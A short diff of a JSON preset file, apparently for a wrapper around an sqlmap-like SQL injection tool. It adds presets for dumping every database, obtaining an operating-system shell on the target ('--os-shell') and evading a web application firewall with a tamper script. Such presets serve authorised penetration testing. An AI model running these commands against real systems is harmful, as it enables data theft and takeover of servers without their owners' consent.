@@ -3,18 +3,23 @@
   "presets": [
     {
       "name": "basic-scan",
-      "description": "Test for SQL injection vulnerabilities on a URL.",
-      "command": "-u http://{ip}/vulnerable.php?id=1"
+      "description": "Runs a basic SQL injection scan.",
+      "command": "-u http://{ip}/vulnerable-page -o {output_file}"
     },
     {
-      "name": "dump-database",
-      "description": "Dump all data from the database.",
-      "command": "-u http://{ip}/vulnerable.php?id=1 --dump"
+      "name": "database-dump",
+      "description": "Dumps all databases.",
+      "command": "-u http://{ip}/vulnerable-page --dump -o {output_file}"
     },
     {
-      "name": "current-user",
-      "description": "Retrieve the current database user.",
-      "command": "-u http://{ip}/vulnerable.php?id=1 --current-user"
+      "name": "os-shell",
+      "description": "Attempts to obtain an OS shell.",
+      "command": "-u http://{ip}/vulnerable-page --os-shell -o {output_file}"
+    },
+    {
+      "name": "tamper-scripts",
+      "description": "Uses tamper scripts to evade WAF.",
+      "command": "-u http://{ip}/vulnerable-page --tamper=space2comment -o {output_file}"
     }
   ]
 }
